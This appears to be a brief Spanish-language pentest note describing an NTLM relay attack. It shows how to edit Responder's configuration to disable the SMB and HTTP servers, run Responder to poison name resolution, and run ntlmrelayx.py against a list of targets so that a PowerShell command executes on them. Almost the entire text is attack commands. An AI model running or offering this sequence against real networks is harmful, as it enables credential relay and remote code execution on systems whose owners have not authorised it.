Cambiar la configuracion de responder:

```javascript
vim /usr/share/responder/Responder.conf

[Responder Core]
; Servers to start

SQL = On
SMB = On <---- Pasar este parametro a Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On <---- Pasar este parametro a Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
SNMP = Off
MQTT = On
```

Ejecutar 

```java
Responder -I {Interfaz} -dw
```

Mientras se ejecuta responder ejecutar:

```java
ntlmrelayx.py -tf {Archivo con objetivos} -smb2support -c "{Comando powershell}"
```

